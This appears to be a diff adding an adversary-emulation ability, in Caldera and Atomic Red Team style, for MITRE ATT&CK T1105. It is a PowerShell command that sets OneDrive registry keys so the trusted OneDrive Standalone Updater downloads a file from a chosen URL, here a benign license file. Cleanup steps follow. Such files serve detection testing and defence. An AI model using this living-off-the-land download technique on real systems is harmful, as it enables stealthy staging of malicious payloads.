@@ -1,0 +1,37 @@
+---
+- id: be18f8de1072fa9734b3c6290e5f846c
+  name: Download a file with OneDrive Standalone Updater
+  description: 'Uses OneDrive Standalone Updater to download a file from a specified
+    URL by setting up the required registry keys.
+
+    This technique can be used to download files without executing anomalous executables.
+
+    Reference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: if (-not (Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"))
+          {;     Write-Host "OneDriveStandaloneUpdater.exe not found at C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe.
+          Test cannot continue.";     exit 1; }; New-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Name "UpdateRingSettingURLFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+          -Type String -Force; Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Name "ODSUUpdateXMLUrlFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+          -Type String -Force; Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Name "UpdateXMLUrlFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+          -Type String -Force; Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Name "UpdateOfficeConfigTimestamp" -Value 99999999999 -Type QWord -Force;
+          & "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"
+        payloads: []
+        cleanup: Remove-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig"
+          -Force -ErrorAction Ignore; Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json"
+          -Force -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
